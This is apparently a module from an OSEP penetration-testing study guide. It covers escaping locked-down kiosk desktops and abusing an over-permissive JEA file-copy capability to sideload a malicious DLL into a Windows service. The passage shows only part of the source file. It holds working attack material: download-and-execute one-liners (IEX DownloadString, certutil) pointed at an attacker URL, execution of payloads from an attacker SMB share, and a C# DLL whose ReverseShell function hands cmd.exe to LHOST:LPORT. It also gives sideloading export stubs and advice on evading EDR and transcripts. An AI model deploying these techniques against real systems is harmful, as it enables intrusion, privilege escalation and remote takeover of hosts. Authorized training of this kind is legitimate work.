::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 14 · Scenarios 41–43: Kiosk breakout · JEA over-permissive file copy · JIT time window

> Basis: this topic has no direct entry in the source material; the following is organized from the lab approach in the textbook's chapter 16 (restricted desktop / kiosk breakout) and chapter 23 (PowerShell restricted endpoints: JEA and just-in-time authorization JIT), plus general enumeration and validation methods.
>
> Style convention: Chinese notes plus English commands; placeholders are unified as `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`.
>
> Files in this module: [14-kiosk-jea-jit](/modules/14-kiosk-jea-jit), `m14-jea-file-copy.ps1`, `m14-jea-service-dll.cs`, `m14-jit-admin-window.ps1`, `m14-kiosk-breakout.md`.

## 0. Scenario overview

| Scenario | Topic | Entry → goal | Main scripts |
|---|---|---|---|
| 41 | Kiosk breakout | Restricted single-app desktop → local command execution (kiosk user level) | `m14-kiosk-breakout.md` path checklist |
| 42 | JEA over-permissive file copy | Restricted PowerShell endpoint (only allow-listed commands such as `Copy-Item`) → service account code execution | `m14-jea-file-copy.ps1` + `m14-jea-service-dll.cs` |
| 43 | JIT time window | Temporary admin authorization → planned commands inside the window + use of residual tickets outside it | `m14-jit-admin-window.ps1` |

Common prerequisites: you already hold domain credentials (`DOMAIN\USER` plus `PASS` or `NTHASH`) and can reach `TARGET` over the network - scenario 41 is usually an RDP or physical session, 42 needs WinRM (5985/5986), and 43 needs LDAP (389) or WinRM.

---

## Scenario 41 · Kiosk breakout path checklist

### Situation
The target machine runs as a "single-app kiosk": the Windows shell is replaced, or Assigned Access locks it to one application (a browser, an in-house program, a PDF reader, and so on). We can interact with it (physical terminal or RDP), but the Start menu, Win+R, Task Manager, and launching cmd/PowerShell directly are all unavailable or removed by policy. Task: find at least one path to **command execution**. The breakout usually lands first in the kiosk user's identity (standard rights); escalation and lateral movement then follow the normal process (see M06/M07).

### Assumptions
- The kiosk user is an ordinary domain or local user without administrator rights - after the breakout expect a low-privilege shell first.
- Do not assume "every system channel is blocked": many kiosks lock only the obvious entries (shell/Start menu), and the deeper dialog channels (Open/Save As/Print/Help) are often left open.
- If the kiosk app crashes or can be closed (Alt+F4) and drops you to the desktop, that is the desktop handed to you - probe the shell state first instead of rushing to drill holes.
- You need to be able to reach the attacker machine (`LHOST` reachable from the kiosk), or to bring the command output out with you.

### Prepare (attacker side)
- Start a listener: `nc -lvnp LPORT`, or a C2 listener.
- Have the stage-2 `PAYLOAD` ready (a PowerShell one-liner or an executable) and note the `URL` you can deliver over (HTTP/SMB).
- Keep the path checklist `m14-kiosk-breakout.md` within reach and tick items off one at a time.
- If you are going in over RDP: confirm whether clipboard and local drive mapping work (if they do, delivery is easier).

### Procedure
Work through the channels in order of increasing cost, quiet before loud, and decide the **success signal** for each one before you touch it:

1. **Shell and application state**: does Alt+Tab show other windows; does the Win key / Ctrl+Esc open the Start menu; does closing the kiosk app (Alt+F4 / close from the taskbar) drop you to the desktop; does Ctrl+Shift+Esc open Task Manager.
2. **Browser / HTML host** (try this first when the kiosk app is a browser):
   - IE / old engine (same for the WebBrowser control): type `file:///C:/Windows/System32/cmd.exe` in the address bar → an "Open/Run" prompt appears → choose Run and you have cmd.
   - Chrome/Edge: a file URL only triggers a download and cannot execute directly (that is the modern default), so move on to the dialog channels in items 3 and 4.
3. **Generic file dialog escape** (any "Open/Save As/Import/Export/Attach file" button inside the kiosk app): the modern Open/Save dialog has its own address bar and file name box - type `C:\Windows\System32` in the address bar and press Enter to enter the directory, then type `cmd.exe` in the address bar and press Enter (Explorer-family dialogs execute program names found on PATH; if it does not recognize the name, type the full path). **This is the most common channel and the one most often left unblocked.**
4. **Print/export dialogs**: any "Print to PDF / Save as PDF / Export report" entry carries a file dialog, so reuse item 3.
5. **Help system**: if the app's "Help" opens as a .chm (an hh.exe window), the "jump URL/shortcut" entries inside the CHM can point at an external program; if Help opens in the browser → go back to item 2.
6. **Accessibility / input method**: if Win+U works it opens Ease of Access, and its links (Narrator/on-screen keyboard) sometimes surface the system UI; the on-screen keyboard usually carries a virtual Win key.
7. **Task Manager channel**: Ctrl+Shift+Esc → File → Run new task → type `cmd`. If UAC appears, the operation is requesting elevation - switch to a user-level channel (Task Manager's "Run new task" does not always elevate for the current user, so it is worth trying).
8. **As soon as you have command execution, solidify the position**: write the channel and the reproduction steps into the checklist, then pop back to your shell (see Validation) rather than walking in and out repeatedly.

### Scripts used
- `m14-kiosk-breakout.md`: per-channel path checklist with the "success signal / blocked signature / notes" for every entry, used to tick items off on site.

### Validation
- A callback arrives: `nc -lvnp LPORT` receives a connection, or command output is visible.
- From the shell, confirm identity and network: `whoami` (should be the kiosk user), `ipconfig`, `netstat -ano`, `cmdkey /list`, `dir %APPDATA%\Microsoft\Credentials`.
- If all you have is file-system access inside a dialog rather than a full shell, the bar is "can you reproduce it reliably without disrupting the kiosk business".
- Record the integrity level: `whoami /groups | findstr /i "Mandatory Integrity"` - that tells you whether the next step is escalation or direct lateral movement.

### Failure branches and alternatives
- **Open/Save As dialogs are all blocked by policy**: try the print dialog, an error dialog (deliberately trigger a kiosk app error, which often carries "View log/Details/Open location" links); or the Win key on the on-screen/touch keyboard.
- **The browser only downloads, never executes**: after the download, use the item 3 dialog channel to navigate to the download directory and execute from there; or deliver a file that a system handler opens (`.hta`/`.lnk`) and hunt for a dialog/jump channel from inside that handler.
- **All user-level channels are blocked**: fall back to system-level entries - with physical access, consider the boot order/firmware (beyond the usual exam scope); an RDP kiosk can be disconnected and reconnected to watch the pre-login interface (accessibility entries such as sethc/utilman belong to the pre-login scenario and need a writable system disk - see the M06 approach).

### Exam / OPSEC notes
- **Try each channel once**: repeated probing leaves a lot of suspicious interaction in the shell/EDR; start with the quiet dialog-type channels (no process behavior) and avoid touching disk before your shell comes back.
- A cmd window that pops up can flash past: fold the stage-2 into a single command (`cmd /c powershell -nop -w hidden -enc <PAYLOAD>`) to cut the window's dwell time.
- After the breakout prefer memory-only channels (PowerShell reflection / Add-Type in-memory loading); do not drop an exe in a kiosk-writable directory.
- Keep the checklist ticked: the report must state clearly which channels worked, which were blocked, and the reproduction steps.

---

#### `m14-kiosk-breakout.md` {#m14-kiosk-breakout-md}

````markdown
# Kiosk breakout path checklist (Scenario 41)

> Purpose: a tick-box checklist of the channels that can give you command execution on a restricted kiosk desktop (single app / Assigned Access / replaced shell),
>
> and of how to turn an execution opportunity into a stable payload.
>
> Scenario: 41 (restricted kiosk desktop only, no terminal)
>
> Dependencies: physical terminal or RDP interaction; a listener already running on the attacker side (`nc -lvnp LPORT`) plus a stage-2 `PAYLOAD` and a delivery `URL`
>
> Use: work through it on site in order of increasing cost, quiet before loud, and **try each item once**; record the result in the §5 checklist (the report must state which channels worked and which were blocked)
>
> Placeholders: `LHOST` (attacker IP), `LPORT` (listener port), `TARGET` (target host), `USER` (kiosk account), `URL` (delivery address), `PAYLOAD` (payload file name)
>
> Test status: operational notes, no executable code; every command must be checked against the actual version in the lab (especially the browser engine and the Edge/Chrome policies)

---

## 1. Confirm the shape of the restriction first (do not rush to drill holes)

| What to confirm | How to confirm | How to use the answer |
|---|---|---|
| Single-app kiosk or restricted shell | Win key / Ctrl+Esc / Ctrl+Alt+Del / Alt+F4 | Alt+F4 closes the kiosk app and lands on the desktop = you already have the desktop, no breakout needed |
| Any other windows | Alt+Tab, taskbar | Leftover Explorer/dialog = look there first for "Open/Save As" |
| Is Task Manager available | Ctrl+Shift+Esc | Available → use §2.7 (File → Run new task) |
| Are there file dialogs | In-app "Open/Save As/Import/Export/Attach file/Print" buttons | Present → §2.2, the most common and most often unblocked channel |
| Is there a writable location | User profile, `%TEMP%`, browser download directory | Decides whether you can touch disk; if not, go memory-only |

---

## 2. Channel checklist

### 2.1 Browser address bar `file://` (try first when the kiosk app is a browser)

| Engine | Action | Success signal | Blocked signature |
|---|---|---|---|
| IE / WebBrowser control (same engine) | Type `file:///C:/Windows/System32/cmd.exe` in the address bar → an "Open/Save" prompt appears → choose **Run** | A cmd window opens directly | The prompt bar is disabled by policy / only Save is offered |
| Chrome / Edge (modern engine) | Same as above | **Only triggers a download, never executes** (default behavior) | Download completes → go to §2.2, use the file dialog to reach the download directory and execute from there |
| Any engine | Browse `file:///C:/Windows/System32/` | Directory listing works = you have at least file-system browse rights | "Cannot access" = file URLs are blocked |

> Alternate entry points: links on `about:` pages, developer tools (F12, if not disabled), the "Print" entry (see §2.4).

### 2.2 Generic file dialogs (Open / Save As / Import / Export / Attach file)

**The most common channel, and the one most often left unblocked.** The modern Open/Save dialog has its own address bar and file name box:

```text
1) Click any "Open/Save As/Import/Export/Attach file" button
2) Type  C:\Windows\System32   in the address bar and press Enter   → you land in that directory
3) Type  cmd.exe               in the address bar and press Enter   → Explorer-family dialogs execute program names found on PATH
   (if the name is not recognized, type the full path C:\Windows\System32\cmd.exe)
4) Or type \\LHOST\share\PAYLOAD in the file name box to execute a file straight off SMB (when egress/the share is reachable)
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| The address bar is editable and navigation works | Address bar read-only / directory tree only | The directory tree also reaches System32, then type `cmd.exe` in the file name box |
| Pressing Enter opens a cmd window | Double-clicking files is stopped by an "Open with" policy | Try `.bat`/`.cmd`/`.exe` each once; `.lnk` works too |

### 2.3 Help → View (Help menu / hh.exe / .chm)

```text
1) App "Help" menu → if it opens as a .chm (an hh.exe window):
   - The "jump to URL / shortcut" entries inside the CHM can point at an external program
   - In the hh.exe window, right-click → View source / Print → this brings up a file dialog (back to §2.2)
2) If Help opens in the browser → back to §2.1/§2.2
3) The Help window's "Options → View / Open" buttons also land in a file dialog
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| A .chm window opens and right-click works | Help menu grayed out / error on open | The error dialog itself is also a channel (see §2.8) |

### 2.4 Print/export dialogs (print to PDF / save as PDF / export report)

```text
1) Any "Print" entry (Ctrl+P) → choose "Save as PDF"/"Print to PDF"/"Export"
2) The "Save as" dialog that appears = a standard file dialog → reuse §2.2 exactly
3) The print preview window usually has "Open/Save/Find" buttons that also carry a dialog
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| A "Save as PDF" file dialog appears | No print permission / printer driver removed | Try other export entries such as "Export to XPS/CSV/Image" |

### 2.5 Installed applications (programs on the allow-list)

| Application | Breakout point | Action that reaches execution |
|---|---|---|
| Notepad | File → **Open** / **Save As** → path bar | Type `C:\Windows\System32` in the path bar, type `cmd.exe` in the file name box and press Enter |
| Notepad | Help → About/Feedback link (some versions carry an http link) | The link opens in the browser → back to §2.1 |
| WordPad | File → Open → "Insert object"/file dialog | Same as §2.2; the inserted object can point at an executable |
| mspaint (Paint) | File → Open / Save As | Same as §2.2 |
| calc (Calculator) | Help → About → link (old versions) / navigation menu | On old versions the http link in "About" can launch the browser; newer versions are basically a dead end, so use another app |
| PDF reader | Open file / Save a copy / Print / Attachments | Every one of these carries a file dialog |
| Browser | Download directory + file dialog; "Show in folder" on a download | That opens an Explorer window → type `cmd.exe` in the address bar |
| Files associated with an Office viewer | Open → macro/object (most kiosks have macros disabled) | If macros are disabled, just use its file dialog |
| cmd / PowerShell allowed | You already have a terminal, no breakout needed | Go straight to §3 |

### 2.6 Accessibility / input method

| Action | Success signal | Notes |
|---|---|---|
| Win+U (Ease of Access Center) | A panel opens with Narrator / on-screen keyboard links | The Narrator window sometimes carries an "Open" entry |
| On-screen keyboard (osk) | The keyboard has a virtual Win key | Try Win+R / Win+E; many kiosks only lock the shell, not this |
| Touch keyboard / IME bar | Can open the input-method settings window | The settings window usually carries "Open location/Browse" buttons |

### 2.7 Task Manager

```text
Ctrl+Shift+Esc → File → Run new task → type cmd (or powershell)
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| "Run new task" works and starts cmd as the current user | UAC appears, meaning it is requesting elevation → switch to a user-level channel | Only consider the UAC route when every user-level channel is blocked (see M06) |

### 2.8 Error dialogs (triggered on purpose)

Deliberately make the kiosk app fail (malformed input, an oversized file, an operation while offline). The error box usually carries "View log / Details / Open location / Export diagnostics",
and those buttons all end up in a file dialog or an Explorer window.

---

## 3. After you get an execution opportunity: turn it into a stable shell

**Principle: quiet (memory) before disk; pre-assemble the commands so they still complete when the window flashes past.**

```bat
:: ① One command, fully formed (it does not matter if cmd flashes past - less dwell time)
cmd /c powershell -nop -w hidden -enc <Base64 of PAYLOAD>

:: ② Download and execute in memory (nothing touches disk; no exe in a kiosk-writable directory)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL/s.ps1')"

:: ③ When you must touch disk, use the built-in downloader and prefer %TEMP%
certutil -urlcache -split -f URL/PAYLOAD %TEMP%\PAYLOAD && %TEMP%\PAYLOAD

:: ④ Immediately after the callback, confirm identity and network (it decides whether the next step is escalation or direct lateral movement)
whoami & hostname & ipconfig & netstat -ano & cmdkey /list
whoami /groups | findstr /i "Mandatory"      :: check the integrity level: Medium = needs elevation, High = already elevated
dir %APPDATA%\Microsoft\Credentials
```

> Fill in `LHOST`/`LPORT` when you generate `PAYLOAD`; keep `nc -lvnp LPORT` running on the attacker machine.
>
> On a kiosk that reverts on every reboot: do not rely on persistence, finish everything inside the current session.

---

## 4. Failure branches

1. **Open/Save As dialogs are all blocked by policy** → the print dialog (§2.4), error dialogs (§2.8), the Win key on the on-screen keyboard (§2.6).
2. **The browser only downloads, never executes** → after downloading, use §2.2 to reach the download directory and execute there; or deliver a file that a system handler opens (`.hta`/`.lnk`/`.chm`),
   and then hunt for a dialog/jump channel from inside that handler.
3. **All user-level channels are blocked** → system-level entries (boot order/firmware when you have physical access, beyond the usual exam scope);
   an RDP kiosk can be disconnected and reconnected to observe the pre-login interface (accessibility entries belong to the pre-login scenario and need a writable system disk, see M06).
4. **Writing to the Startup directory is denied by ACL** → switch to `%TEMP%`/the user profile; if you can create a scheduled task, trigger through that instead.
5. **The kiosk reverts on every reboot** → give up on persistence and finish every action inside the current session.

---

## 5. On-site tick list

```text
[ ] Alt+F4 / closing the app drops you to the desktop        [ ] Win key / Ctrl+Esc opens the Start menu
[ ] Ctrl+Shift+Esc Task Manager            [ ] File → Run new task → cmd
[ ] Browser address bar file:///C:/Windows/System32/cmd.exe    [ ] Open dialog address bar → cmd.exe
[ ] Save As dialog → cmd.exe               [ ] Print/Export PDF → Save As dialog
[ ] Help → View / hh.exe / .chm          [ ] Installed apps: Notepad / WordPad / mspaint / calc / PDF
[ ] Win+U Ease of Access / on-screen keyboard Win key      [ ] Deliberately trigger an error → View log/Open location
[ ] Execution opportunity solidified (callback succeeded / command output visible)
[ ] Recorded: working channels, blocked channels, reproduction steps (goes in the report)
```

---

## 6. OPSEC reminders

- **Try each channel once**: repeated probing leaves a lot of suspicious interaction in the shell/EDR; prefer the dialog-type channels with no process behavior.
- Avoid touching disk before the callback; after the breakout prefer memory-only channels (PowerShell reflection / `Add-Type` in-memory loading).
- Kiosks often have screen recording/monitoring, so work fast and pre-write the commands to paste and run in one go.
- Keep the tick list: the report must state which channels worked, which were blocked, and how to reproduce them.
````

## Scenario 42 · JEA over-permissive file copy + service load trigger

### Situation
The domain has a restricted PowerShell endpoint (JEA; at logon you select the session configuration with `-ConfigurationName`, for example `BackupMaintenance`). The low-privilege account we control is a member of a JEA role, and that role's capability is **too broad**: it allows `Copy-Item` with `-Destination` not restricted to safe directories (so you can write into service directories and similar), or it additionally allows `Restart-Service` on a chosen service. The capability allow-list contains no arbitrary command execution, so you cannot run code directly in the JEA session. Attack idea: use the file copy to place a malicious DLL where a **service/daemon will load a DLL from that directory** (a "missing dependency DLL" in the directory, or a plug-in DLL), then trigger the load so the code runs in the service account's context.

### Assumptions
- You know the JEA endpoint name, and our account is a member allowed by the endpoint's permission (you can get the endpoint name with `Get-PSSessionConfiguration`, or from memory/social engineering).
- A suitable target exists: a directory that file copy can write to, plus a service that loads a DLL from that directory. The most common case is a third-party service's install directory (DLL search-order sideloading) or the service's plug-in/module directory.
- At least one trigger is available: the role allows `Restart-Service`/`Stop-Service`+`Start-Service`; or the service restarts automatically on a schedule; or an administrator restarts that service by hand.
- The JEA session runs as a virtual account or managed service account, so writing to disk is bounded by that account's rights - being able to write into the service directory is exactly what "capability too broad" looks like.

### Prepare (attacker side)
- Prepare the malicious DLL: `m14-jea-service-dll.cs` (or switch to the native C DLL template from M04, depending on the kind of dependency the target is missing).
- Start a listener: `nc -lvnp LPORT`; confirm `LHOST` can reach `TARGET` on 5985/5986.
- Try to establish the target service exe's real missing dependency name and its architecture (x64/x86) first - a sideloaded DLL's **file name and architecture must match the host**.

### Procedure
1. **Discover the endpoint** (when you can enumerate it from another machine or with other credentials):
   `Get-PSSessionConfiguration | Select-Object Name, Permission`
2. **Build credentials and connect to the JEA endpoint**:
   `$cred = Get-Credential DOMAIN\USER`; `Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA-endpoint> -Credential $cred`
   (With only an NTHASH and no cleartext, a direct WinRM connection cannot use the hash - switch to the evil-winrm/PowerShell hash logon templates from `m15`, or convert the NTHASH into a ticket first.)
3. **Enumerate the commands available inside the session**: `Get-Command | Select-Object Name, Source` - JEA hides everything that is not allowed, so **what you can see is what you can use**. Confirm `Copy-Item` is in the list; whether `Restart-Service`/`Test-Path` are listed decides your trigger and validation strategy.
4. **Probe the boundary (harmless file)**: `Copy-Item C:\Windows\Temp\probe.txt -Destination <candidate-dir>\m14probe.txt`. The success or the error message tells you whether that directory is inside the copy capability (Access Denied/a path that is excluded → pick another directory).
5. **Identify the target service and DLL name**: if you can list services (`Get-Service`, when it is on the allow-list) do that directly; otherwise reason from the software you know is on the target. Key point: **the file name you drop must be a dependency the host is missing, or a plug-in name the host will load**, and the architecture must match.
6. **Drop the malicious DLL**: `Copy-Item \\LHOST\share\evil.dll -Destination "<service-dir>\<missing-dep-name>.dll" -Force` (keep a backup copy of the original DLL on the attacker machine first, so you can restore it afterwards).
7. **Trigger the load**:
   - The role allows it: `Restart-Service <service-name>` (also try `Stop-Service` then `Start-Service`; some capabilities allow only one of the two).
   - No service control allowed: wait for the service to restart itself or for an administrator to act; keep the listener up and have persistence prepared in advance.
8. **Collect and clean up**: after the shell calls back, `whoami` should be the service account; check the listener log and the DLL's behavior, then restore any overwritten files as needed.

### Scripts used
- `m14-jea-file-copy.ps1`: automates steps 2, 4, 6 and 7 from the attacker machine (build credentials → enter the JEA session → enumerate commands → harmless boundary probe → drop the payload → trigger), printing the result of each step.
- `m14-jea-service-dll.cs`: the DLL payload template that gets dropped (two modes: call back on load, or execute a command, with compilation route notes).

### Validation
- Inside the session, `Get-Command` shows `Copy-Item` and the other allow-listed commands → the endpoint is reachable and the capability matches expectations.
- The probe file really was written to the target directory (validate directly with `Test-Path` inside the session if it is allowed; otherwise copy over a file of the same name with a second `Copy-Item` and read the "already exists/in use" error as an indirect signal).
- After the trigger the listener receives a callback and `whoami` is the service account → end-to-end success.

### Failure branches and alternatives
- **`-Destination` is in fact restricted** (error/excluded): try to read the role capability file to locate the allowed paths - the `FileSystem` section of `C:\Program Files\WindowsPowerShell\Modules\<module>\<role-capability>\*.psrc` (if you can read it); or switch to a combination where you write into a share root and the target service treats that share as a module/configuration directory.
- **The service does not load the DLL you placed** (wrong name or wrong dependency): first confirm on the attacker machine which DLL the service exe's import table is missing, using the dumpbin/ProcMon approach; without ProcMon, consult the "known sideloadable DLL names" list for that software version (things like `version.dll`, `winmm.dll`).
- **There is no service-control command and the service never restarts on its own**: reuse the file-copy capability against a different trigger object - a logon script in a writable location, a scheduled-task script, a `Startup` shortcut, a configuration file that gets executed periodically - turning a "service trigger" into an "event trigger" (user logon/scheduled task).
- **The service context is NetworkService/LocalService rather than SYSTEM**: accept that context for lateral movement, or pick a different service target that runs as SYSTEM.

### Exam / OPSEC notes
- JEA endpoints usually enforce a **transcript**, so every command in the session is recorded: keep sensitive actions inside the DLL and leave only role-appropriate operations such as `Copy-Item`/`Restart-Service` in the JEA session.
- Use harmless files for probing and file names that fit normal business naming; naming the real DLL exactly like the dependency the host is missing greatly reduces suspicion.
- Restarting a service can disrupt business: prefer a non-critical or replica service; record the service's original state before triggering and restore it at the end.
- Confirm the callback address `LHOST` inside the DLL **one last time** before delivery - once it is out there you cannot change it.

---

#### `m14-jea-service-dll.cs` {#m14-jea-service-dll-cs}

````csharp
// Purpose: Service DLL payload of JEA scenario - executed when loaded by high-privilege context (service account/SYSTEM/InstallUtil host),
// The action is "Write with higher permissions to a location that a low-privileged account cannot write to" (verify that the unauthorized write is successful), and you can optionally connect back to LHOST:LPORT.
// Scenario: 42 (JEA session exposes only a few commands, including over-privileged file copying)
// Depends: .NET Framework 3.5+/4.x (csc.exe comes in C:\Windows\Microsoft.NET\Framework64\v4.0.30319)
// Compile:
// # ① InstallUtil trigger route (no native export required, most stable)
//   csc.exe /target:library /out:m14-jea-service-dll.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
// # ② Native export (side loading) route: DllExport tool chain (3F/DllExport or UnmanagedExports) is required followed by -define:USE_DLLEXPORT
//   csc.exe /target:library /define:USE_DLLEXPORT /out:version.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
// # ③ 32-bit host must use 32-bit csc: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe (x64 service cannot load x86 DLL)
// Usage: 
// # InstallUtil trigger (if Restart-Service is allowed in the JEA session, the target service can also be triggered by restarting it)
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U m14-jea-service-dll.dll
// # Side-loading trigger: name the DLL after the dependency the host is missing (for example version.dll), place it in the service directory and restart the service.
//   copy m14-jea-service-dll.dll "C:\Program Files\TargetSvc\version.dll" /Y
//   sc stop TargetSvc && sc start TargetSvc
// Placeholders: LHOST=attack machine IP, LPORT=listening port (reconnection mode; automatically skip reconnection when not replaced and only do mark writing)
// Test status: Not compiled on this machine (no csc); the code is written according to .NET Framework 4.x API and needs to be compiled and verified in the experimental environment
//
// Export name and calling convention (which determines the success or failure of sideloading, be sure to check it word for word):
// 1. The file name must be exactly the same as the DLL that the host is looking for (the missing dependency seen by ldd/dumpbin/imports or ProcMon,
// Common sideloadable names: version.dll, winmm.dll, winhttp.dll, dbghelp.dll, profapi.dll).
// 2. The exported function name, number and order of parameters, and return value must be consistent with the original DLL; this file provides six exports of version.dll.
// 3. Calling convention: x86 uses StdCall ([UnmanagedFunctionPtr(CallingConvention.StdCall)]), and all conventions under x64 are equivalent.
// But the attribute is still written as StdCall for consistency; the name modification (_GetFileVersionInfoW@16) is handled by the DllExport tool,
// After generation, use dumpbin /exports version.dll to check that there are no redundant prefixes/suffixes in the export name.
// 4. Do not export DllMain: The DllMain of a managed DLL is taken over by the CLR, and manual export is prone to deadlock loader locks.
// Use module initialization when "load and execute" is required (the static constructor of this file has triggered the Payload when the export is first called).
// 5. The architecture must match the host: x64 service will directly report BadImageFormatException when loading x86 DLL.

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

#if !USE_DLLEXPORT
// When using the DllExport toolchain (-define:USE_DLLEXPORT above), this feature is provided by the tool and this section is skipped.
// When not using the tool chain (only taking the InstallUtil/hosted service route), the placeholder feature with the same name is given here to ensure that the file can be compiled directly with csc.
[AttributeUsage(AttributeTargets.Method, AllowMultiple = false)]
public sealed class DllExportAttribute : Attribute
{
    public DllExportAttribute() { }
    public DllExportAttribute(string exportName) { ExportName = exportName; }
    public string ExportName { get; set; }
    public CallingConvention CallingConvention { get; set; }
}
#endif

namespace M14Jea
{
    // Payload ontology: All trigger routes (InstallUtil/Service/Native Export) eventually call Payload.Run()
    public static class Payload
    {
        // High-privilege write target: Ordinary domain users cannot write in. If they can write successfully, it means that "writing without privileges + code running under a service account" is true.
        private const string MarkerPath = @"C:\Program Files\Common Files\m14-jea.marker";

        // Backlink target (placeholder, replaced before delivery; automatically skips backlink if not replaced)
        private const string LHOST = "LHOST";
        private const int LPORT = 4444;

        private static int _done = 0;

        public static void Run()
        {
            // Run only once: The host may call the exported function multiple times/load it multiple times
            if (Interlocked.Exchange(ref _done, 1) == 1) return;

            try { WriteMarker(); }
            catch (Exception ex) { TryLog("marker failed: " + ex.Message); }

            try { if (!LHOST.Contains("LHOST")) ReverseShell(LHOST, LPORT); }
            catch (Exception ex) { TryLog("rev failed: " + ex.Message); }
        }

        // Action ①: Write the file with higher permissions - this is the "task body" of this DLL and the best step to verify
        private static void WriteMarker()
        {
            string who;
            try { who = WindowsIdentity.GetCurrent().Name; }
            catch { who = Environment.UserName; }

            string body = "m14-jea-service-dll marker\n"
                        + "time : " + DateTime.Now.ToString("o") + "\n"
                        + "who  : " + who + "\n"
                        + "proc : " + Process.GetCurrentProcess().ProcessName + "\n"
                        + "path : " + MarkerPath + "\n";

            string dir = Path.GetDirectoryName(MarkerPath);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            {
                // Create the directory even if it does not exist: this step itself requires high permissions
                Directory.CreateDirectory(dir);
            }
            File.WriteAllText(MarkerPath, body, Encoding.UTF8);
        }

        // Action ②: optional callback (replace LHOST/LPORT with real values first; the callback is skipped automatically when they are not replaced)
        private static void ReverseShell(string host, int port)
        {
            TcpClient client = new TcpClient();
            client.Connect(host, port);
            NetworkStream ns = client.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();

            Thread t1 = new Thread(() => { try { p.StandardInput.BaseStream.CopyTo(ns); } catch { } });
            Thread t2 = new Thread(() => { try { ns.CopyTo(p.StandardInput.BaseStream); } catch { } });
            t1.IsBackground = true; t2.IsBackground = true;
            t1.Start(); t2.Start();

            p.WaitForExit();
            try { client.Close(); } catch { }
        }

        // Do not throw any exceptions: if the service fails to start, event logs will be written, which will make it more exposed.
        private static void TryLog(string msg)
        {
            try
            {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "m14-jea-err.txt"),
                                   DateTime.Now.ToString("o") + " " + msg + Environment.NewLine);
            }
            catch { }
        }
    }

    // Route ①: InstallUtil host (InstallUtil.exe /U m14-jea-service-dll.dll triggers Uninstall, Install is the same)
    [RunInstaller(true)]
    public class JeaInstaller : Installer
    {
        public override void Install(System.Collections.IDictionary stateSaver)
        {
            Payload.Run();
            base.Install(stateSaver);
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Payload.Run();
            base.Uninstall(savedState);
        }
    }

    // Route ②: Managed service (if the target service is a .NET service, you can put it into the service directory as a plug-in/dependent DLL and restart the service)
    public class JeaService : ServiceBase
    {
        public JeaService() { ServiceName = "M14JeaSvc"; }

        protected override void OnStart(string[] args)
        {
            // Must return immediately, otherwise SCM reports "Service startup timeout" (1053) - the load is placed in the background thread
            Thread t = new Thread(new ThreadStart(Payload.Run));
            t.IsBackground = true;
            t.Start();
        }

        protected override void OnStop() { }
    }

    // Route ③: Native export (side loading). Taking version.dll as an example, the export name/signature/calling convention copies the real Windows API.
    public static class Exports
    {
        private const string RealDll = @"C:\Windows\System32\version.dll";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool GetFileVersionInfoWDelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool GetFileVersionInfoADelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetFileVersionInfoSizeWDelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate int GetFileVersionInfoSizeADelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool VerQueryValueWDelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool VerQueryValueADelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        // Forwarding: Get the original function from the real version.dll of System32 to ensure that the host business is not affected (no crash)
        private static T Resolve<T>(string exportName) where T : class
        {
            IntPtr h = LoadLibrary(RealDll);
            if (h == IntPtr.Zero) return null;
            IntPtr fn = GetProcAddress(h, exportName);
            if (fn == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(fn, typeof(T)) as T;
        }

        [DllExport("GetFileVersionInfoW", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoW(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoWDelegate real = Resolve<GetFileVersionInfoWDelegate>("GetFileVersionInfoW");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoA", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoA(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoADelegate real = Resolve<GetFileVersionInfoADelegate>("GetFileVersionInfoA");
            return real != null ? real(filename, handle, len, data) : false;
        }

